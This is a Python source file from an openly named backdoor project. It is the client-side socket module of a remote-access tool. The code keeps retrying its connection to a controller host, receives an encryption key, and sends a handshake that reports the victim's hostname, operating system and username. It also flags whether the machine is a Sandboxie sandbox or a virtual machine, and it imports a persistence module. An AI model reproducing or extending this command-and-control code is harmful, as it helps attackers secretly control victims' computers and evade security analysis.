"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import platform
import socket
import time

from src.client import persistence
from src.encrypted_socket import EncryptedSocket
from src.defs import *


class Socket(EncryptedSocket):
    def __init__(self, host, port):
        super().__init__()

        self.host = host
        self.port = port
        self.socket = socket.socket()
        self.identity = get_identity()

    def connect(self):
        while True:  # infinite loop until socket can connect
            try:
                self.socket.connect((self.host, self.port))
            except socket.error:
                time.sleep(3)  # wait 3 seconds to try again
            else:
                break

        while True:
            command = self.recv_json(False)
            if command["key"] == CLIENT_KEY:
                self.set_key(command["value"])
                break

        # send handshake
        self.send_json(CLIENT_HANDSHAKE, self.identity)


def get_identity():
    info = [socket.gethostname()]
    _platform = f"{platform.system()} {platform.release()}"

    if persistence.detect_sandboxie():
        _platform += " (Sandboxie) "
    if persistence.detect_vm():
        _platform += " (VM) "

    info.extend([_platform, os.environ["USERNAME"]])

    return info
